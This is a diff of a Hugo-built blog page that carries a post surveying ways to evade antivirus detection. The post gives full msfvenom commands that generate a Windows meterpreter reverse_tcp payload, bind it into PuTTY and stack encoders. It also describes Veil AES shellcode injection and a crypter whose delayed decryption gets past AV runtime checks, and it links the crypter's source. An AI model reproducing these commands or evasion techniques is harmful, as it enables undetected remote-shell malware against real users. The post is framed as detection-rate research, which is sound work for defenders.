@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.59.0" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
         
 
         
@@ -162,10 +162,9 @@
     
 
     
-    
 
     <h4><a href="/post/crypt0r/">A Quick Survey on Anti-Anti-Viruses</a></h4>
-    <h5>March 16, 2018</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/c&#43;&#43;"><kbd class="item-tag">c&#43;&#43;</kbd></a>
     
@@ -176,18 +175,11 @@
 
 
     <br>
-    <div class="content-width text-justify">
-
-<h1 id="tl-dr">tl;dr</h1>
-
+    <div class="content-width text-justify"><h1 id="tldr">tl;dr</h1>
 <p>AVs can easily be bypassed using malware AES crypters like <a href="https://github.com/ps1337/Crypt0r">Crypt0r</a>:</p>
-
-<p><img src="/img/crypt0r/results.png" alt="AES Parameters" /></p>
-
+<p><img src="/img/crypt0r/results.png" alt="AES Parameters"></p>
 <h1 id="open-source-evasion-techniques">Open Source Evasion Techniques</h1>
-
 <p>All of the following results are based on a meterpreter file which was generated like this:</p>
-
 <pre><code>msfvenom
   -p windows/meterpreter/reverse_tcp
   --platform windows
@@ -195,29 +187,12 @@
   LHOST=192.168.1.1
   LPORT=1337
   -o meter.exe
-</code></pre>
-
-<p>All scans are performed on <a href="https://www.virustotal.com">VirusTotal</a>. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&rsquo;t required at all.</p>
-
+</code></pre><p>All scans are performed on <a href="https://www.virustotal.com">VirusTotal</a>. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren't required at all.</p>
 <h2 id="packers">Packers</h2>
-
 <p>Packers compress malware and decompress it at runtime using an embedded decompression stub. Using the packer <code>UPX</code> seems to be suspicious as the detection rates increase by using a packer:</p>
-
-<table width=100% border=1>
-    <tr>
-        <td align="center" valign="middle"><b>Without Packer</b></td>
-        <td align="center" valign="middle"><sup>39</sup>⁄<sub>56</sub></td>
-    </tr>
-    <tr>
-        <td align="center" valign="middle"><b>With Packer</b></td>
-        <td align="center" valign="middle"><sup>41</sup>⁄<sub>56</sub></td>
-    </tr>
-</table>
-
+<!-- raw HTML omitted -->
 <h2 id="binder">Binder</h2>
-
 <p>This technique basically combines two executables, a malicious and an ordinary one, into one file. The malicious code will be executed in a separate thread upon startup. This command was used to generate a meterpreter shell in combination with the SSH client PuTTY:</p>
-
 <pre><code>msfvenom
   -p windows/meterpreter/reverse_tcp
   --platform windows
@@ -228,47 +203,13 @@
   LPORT=1337
   -f exe
   -o meter.exe
-</code></pre>
-
-<p>A slight decrease of detections can be seen:</p>
-
-<table width=100% border=1>
-    <tr>
-        <td align="center" valign="middle"><b>Without Binder</b></td>
-        <td align="center" valign="middle"><sup>39</sup>⁄<sub>56</sub></td>
-    </tr>
-    <tr>
-        <td align="center" valign="middle"><b>With Binder</b></td>
-        <td align="center" valign="middle"><sup>33</sup>⁄<sub>56</sub></td>
-    </tr>
-</table>
-
+</code></pre><p>A slight decrease of detections can be seen:</p>
+<!-- raw HTML omitted -->
 <h2 id="encoders">Encoders</h2>
-
 <p>Using Encoders, the malicious payload will be obscured. There are many different approaches for this, however the polymorphic encoder <code>shikata_ga_nai</code> is one of the most widely used ones. When executing a encoded malware file, the entry point of the decoding method will be called. The payload will then be decoded and executed.</p>
-
-<p>The results are the following:
-<table width=100% border=1>
-    <tr>
-        <td align="center" valign="middle"><b>No Encoder</b></td>
-        <td align="center" valign="middle"><sup>39</sup>&frasl;<sub>56</sub></td>
-    </tr>
-    <tr>
-        <td align="center" valign="middle"><b>XOR</b></td>
-        <td align="center" valign="middle"><sup>33</sup>&frasl;<sub>56</sub></td>
-    </tr>
-    <tr>
-        <td align="center" valign="middle"><b>powershell_x86</b></td>
-        <td align="center" valign="middle"><sup>33</sup>&frasl;<sub>56</sub></td>
-    </tr>
-    <tr>
-        <td align="center" valign="middle"><b>shikata_ga_nai</b></td>
-        <td align="center" valign="middle"><sup>33</sup>&frasl;<sub>56</sub></td>
-    </tr>
-</table></p>
-
-<p>No change in detection rates - let&rsquo;s combine multiple encoders and the binding technique:</p>
-
+<p>The results are the following:</p>
+<!-- raw HTML omitted -->
+<p>No change in detection rates - let's combine multiple encoders and the binding technique:</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp
   LHOST=192.168.1.1
   LPORT 1337
@@ -297,25 +238,16 @@ msfvenom -a x86
   -k
   -f exe
   -o meter.exe
-</code></pre>
-
-<p>This yields <sup>30</sup>&frasl;<sub>56</sub> - better but still not zero.</p>
-
+</code></pre><p>This yields 30/56 - better but still not zero.</p>
 <h2 id="using-veil">Using Veil</h2>
-
-<p>Using <a href="https://www.veil-framework.com/">Veil</a>, hiding payloads becomes quite easy using a built-in assistant. Using <code>python/shellcode_inject/aes_encrypt</code> in combination with Pyherion and a shellcode for <code>windows/meterpreter/reverse_tcp</code> decreases the detection rate down to <sup>19</sup>&frasl;<sub>56</sub>.</p>
-
+<p>Using <a href="https://www.veil-framework.com/">Veil</a>, hiding payloads becomes quite easy using a built-in assistant. Using <code>python/shellcode_inject/aes_encrypt</code> in combination with Pyherion and a shellcode for <code>windows/meterpreter/reverse_tcp</code> decreases the detection rate down to 19/56.</p>
 <h2 id="crypters">Crypters</h2>
-
 <p>Crypters encrypt the malicious shellcode using a secure encryption algorithm. To execute the payload at runtime, the so called stub brute forces the built-in encrypted shellcode in order to invoke it. Using AES-128 and a delayed decryption, it was possible to decrease the detection down to zero for both scantime and runtime. The runtime detection bypass basically delays the start of the decryption routine by performing unnecessary actions like:</p>
-
 <ul>
 <li>factorizing primes</li>
 <li>approximating pi multiple times</li>
 </ul>
-
 <p>In my tests, wasting about 30 seconds was enough to &ldquo;shake off&rdquo; the AV runtime check.</p>
-
 <p>You can check out the source code <a href="https://github.com/ps1337/Crypt0r">here</a>.</p>
 </div>
 
@@ -333,10 +265,9 @@ msfvenom -a x86
     
 
     
-    
 
     <h4><a href="/post/bananabot/">Coding A CS:GO Hack</a></h4>
-    <h5>June 19, 2019</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
     
@@ -353,10 +284,9 @@ msfvenom -a x86
     
 
     
-    
 
     <h4><a href="/post/multihack/">Creating A Multiplayer Game Hack</a></h4>
-    <h5>August 28, 2018</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/c&#43;&#43;"><kbd class="item-tag">c&#43;&#43;</kbd></a>
     
@@ -375,10 +305,9 @@ msfvenom -a x86
     
 
     
-    
 
     <h4><a href="/post/cvar-hax/">Runtime Function Patching</a></h4>
-    <h5>August 16, 2018</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/c&#43;&#43;"><kbd class="item-tag">c&#43;&#43;</kbd></a>
     
@@ -397,7 +326,7 @@ msfvenom -a x86
 
     <p class="copyright text-muted">
 
-        &copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
     </p>
 </footer>
 </body>
